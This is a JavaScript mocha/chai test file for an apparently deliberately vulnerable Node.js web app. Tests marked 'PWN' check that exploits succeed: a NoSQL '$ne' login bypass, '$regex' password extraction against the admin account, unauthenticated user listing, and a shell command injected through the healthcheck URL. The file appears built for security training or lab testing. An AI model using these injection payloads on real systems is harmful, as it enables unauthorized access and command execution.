import chai from 'chai';
import chaiHttp from 'chai-http';
import app from './app.mjs';
let should = chai.should();

chai.use(chaiHttp);

let accessToken;
let testPostMessage;

describe("Basic tests", function () {

  it("Should wait a little for data population", function (done) {
    this.timeout(5000);
    setTimeout(done, 1500);
  });

  it("GET /: Should have status code 200", function (done) {
    chai.request(app)
      .get("/")
      .end(function (_, res) {
        res.should.have.status(200)
        done()
      });
  });

  it("POST /api/v2/login: Legit login should work", function (done) {
    chai.request(app)
      .post("/api/v2/login")
      .send({ username: "zorzal", password: "fio" })
      .end(function (_, res) {
        accessToken = res.body.token
        res.should.have.status(200)
        done()
      });
  });

  it("PWN /api/v2/login: $ne 1 NoSQL injection should work", function (done) {
    chai.request(app)
      .post("/api/v2/login")
      .send({ "username": { "$ne": "1" }, "password": { "$ne": "1" } })
      .end(function (_, res) {
        res.should.have.status(200)
        done()
      });
  });

  it("PWN /api/v2/login: regex password extraction should work", function (done) {
    chai.request(app)
      .post("/api/v2/login")
      .send({ "username": "admin", "password": { "$regex": "^.{12}$" } })
      .end(function (_, res) {
        res.should.have.status(200)
        done()
      });
  });

  it("PWN /api/v1/users: Show type 2 users", function (done) {
    chai.request(app)
      .get("/api/v1/users/type/2")
      .end(function (_, res) {
        res.should.have.status(200)
        done()
      });
  });

  it("GET /healthcheck: Should get healthcheck", function (done) {
    chai.request(app)
      .get("/healthcheck")
      .end(function (_, res) {
        res.should.have.status(200)
        done()
      });
  });


  it("PWN /healthcheck: Command injection", function (done) {
    chai.request(app)
      .get("/healthcheck/healthcheck|echo 'PWN'")
      .end(function (_, res) {
        res.should.have.status(200)
        done()
      });
  });

});


describe("Authenticated tests", function () {

  it("GET /api/v2/users: Show type 2 users", function (done) {
    chai.request(app)
      .get("/api/v2/users/type/2")
      .set({ Authorization: `Bearer ${accessToken}` })
      .end(function (_, res) {
        res.should.have.status(200)
        done()
      });
  });

  it("POST /api/v2/messages/add: Adding new post", function (done) {
    testPostMessage = "test message " + (new Date()).toISOString();
    chai.request(app)
      .post("/api/v2/messages/add")
      .set({ Authorization: `Bearer ${accessToken}` })
      .send({ message: testPostMessage })
      .end(function (_, res) {
        res.should.have.status(200)
        done()
      });
  });

  it("GET /api/v2/messages: Check added post", function (done) {
    chai.request(app)
      .get("/api/v2/messages")
      .set({ Authorization: `Bearer ${accessToken}` })
      .end(function (_, res) {
        res.should.have.status(200)
        res.body.should.be.an('array')
        res.body[2].should.have.property("message").to.include(testPostMessage)
        done()
      });
  });

});
